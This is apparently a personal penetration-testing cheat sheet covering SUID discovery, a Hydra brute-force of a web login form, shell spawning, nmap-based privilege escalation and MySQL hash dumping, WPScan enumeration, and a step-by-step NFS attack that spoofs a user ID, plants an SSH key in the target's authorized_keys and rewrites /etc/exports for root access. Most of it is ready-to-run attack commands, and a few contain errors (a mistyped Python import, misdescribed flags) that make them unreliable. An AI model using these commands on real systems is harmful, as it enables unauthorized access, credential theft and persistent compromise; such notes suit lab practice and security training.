Find all files with SUID bit

    find / -perm -u=s -type f 2>/dev/null

or

    find / -perm -4000 -type f 2>/dev/null

Explanation:

    /denotes  start from the top (root) of the file system and find every directory
    -permdenotes search for the permissions that follow
    -u=sdenotes look for files that are owned by the root user
    -typestates the type of file we are looking for
    f denotes a regular file not the directories or special files
    2 denotes to the second file descriptor of the process, i.e. stderr (standard error)
    > means redirection
    /dev/null is a special filesystem object that throws away everything written into it.


Hydra Password Bruteforce

    hydra 192.168.1.69 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
    
Explanation:

    Host = 192.168.1.69
    Method = http-form-post
    URL = /w3af/bruteforce/form_login/dataReceptor.php
    Form parameters = user=^USER^&pass=^PASS^
    Failure response = Bad login
    Users file = users.txt
    Password file = pass.txt
    Threads = -t 10
    Wait for timeout = -w 30
    Output file = -o hydra-http-post-attack.txt

To remove all duplicates in a dictionary file

    cat filename.txt | sort | uniq > outfile.txt

Spawn bash

    python -c 'import.pty;pty.spawn("/bin/bash")'

nmap interactive

	nmap --interactive
	!bash -p
more nmap
	-sL : list targets to scan
	-pn : disable port scan(ping sweep?)
	
cool nmap scripts
	
	--script=http-enum
	--script=http-default-accounts
	--script=http-phpmyadmin-dir-traversal
	

passing parameters into nmap script example

	nmap -p 3306 <ip> --script mysql-dump-hashes --script-args='username=root,password=secret'
	nmap -p 3306 100.65.136.252 --script=mysql-query --script-args='query="show tables FROM corporate_database",username=root,password=abc123'
	
	**dont forget username and pass

List of nmap scripts	
https://nmap.org/nsedoc/



WPSCAN

	wpscan --url <url>
	
WPSCAN enumerate users

	-enumerate u
	-e ap **uodate this later**
	
---- NFS ports ----

If NFS ports are open

	showmount -e <ip>
	<returns shared directories> e.g /home/vulnix

Mounting the NFS directory

		cd ~
		mkdir vulnix
		mount -t nfs <ip>:/home/vulnix ~/vulnix
		
View permissions and stuff of the new directory

		ls -ld vulnix
		<this may not show the UID and GID, showing as 'nobody'>
		<e.g drwxr-x--- 2 nobody nobody 4096 Sep  2  2012 vulnix>
		and/or
		stat vulnix
		
Mount differently if cant see UID and GID

		mount -t nfs -o vers=3 <ip>:/home/vulnix ~/vulnix
		ls -ld vulnix
		<should show the real UID and GID this time>
		<e.g mount -t nfs -o vers=3 192.168.2.4:/home/vulnix ~/vulnix >
		
Create a spoof user

		groupadd --gid 2008 vulnix_group
		useradd --uid 2008 --groups vulnix_group vulnix_user
		sudo -u vulnix_user ls -a vulnix
		<if you have permissions now, it should show the file listing in the directory>
		
		
**FIND OUT HOW TO GENERATE SSH KEYS AND PUT HERE **

Copy own key into target's authorized keys

		cp ~/.ssh/id_rsa.pub vulnix/.ssh/authorized_keys

SSH into target

		ssh vulnix@<ip>
		
** extras *8

		cat /etc/exports
		/home/vulnix	*(rw,root_squash)

can add the following into /etc/exports to export the whole machine


		/		*(rw,no_root_squash)
		
find a way to restart computer or service
remount the thing
spoof root uid and gid
add new key again
ssh in as root
